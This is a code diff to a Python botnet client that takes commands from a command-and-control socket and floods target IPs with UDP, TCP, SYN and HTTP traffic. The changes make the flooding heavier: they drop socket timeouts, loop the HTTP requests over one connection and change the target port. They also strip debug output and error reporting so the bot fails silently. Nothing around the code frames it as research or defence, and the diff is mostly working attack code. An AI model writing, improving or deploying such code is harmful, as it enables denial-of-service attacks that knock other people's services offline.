@@ -39,12 +39,10 @@ def attack_udp(ip, port, secs, size):
 def attack_tcp(ip, port, secs, size):
     while time.time() < secs:
         s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-        s.settimeout(2)
         try:
             s.connect((ip, port))
             while time.time() < secs:
-                data = random._urandom(size)
-                s.send(data)
+                s.send(random._urandom(size))
         except:
             pass
 
@@ -61,10 +59,10 @@ def attack_syn(ip, port, secs):
 def attack_http(ip, secs):
     while time.time() < secs:
         s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-        s.settimeout(2)
         try:
-            s.connect((ip, 80))
-            s.send(f'GET / HTTP/1.1\r\nHost: {ip}\r\nUser-Agent: {rand_ua()}\r\nConnection: keep-alive\r\n\r\n'.encode())
+            s.connect((ip, 5050))
+            while time.time() < secs:
+                s.send(f'GET / HTTP/1.1\r\nHost: {ip}\r\nUser-Agent: {rand_ua()}\r\nConnection: keep-alive\r\n\r\n'.encode())
         except:
             s.close()
 
@@ -100,8 +98,6 @@ def main():
 
             args = data.split(' ')
             command = args[0].upper()
-
-            print(data)
 
             if command == '.VSE':
                 ip = args[1]
@@ -143,9 +139,8 @@ def main():
 
             elif command == '.HTTP':
                 ip = args[1]
-                port = int(args[2])
-                secs = time.time() + int(args[3])
-                threads = int(args[4])
+                secs = time.time() + int(args[2])
+                threads = int(args[3])
 
                 for _ in range(threads):
                     threading.Thread(target=attack_http, args=(ip, secs), daemon=True).start()
@@ -153,8 +148,7 @@ def main():
             elif command == 'PING':
                 c2.send('PONG'.encode())
 
-        except Exception as e:
-            print(e)
+        except:
             break
 
     c2.close()
@@ -162,4 +156,7 @@ def main():
     main()
 
 if __name__ == '__main__':
-    main()
+    try:
+        main()
+    except:
+        pass
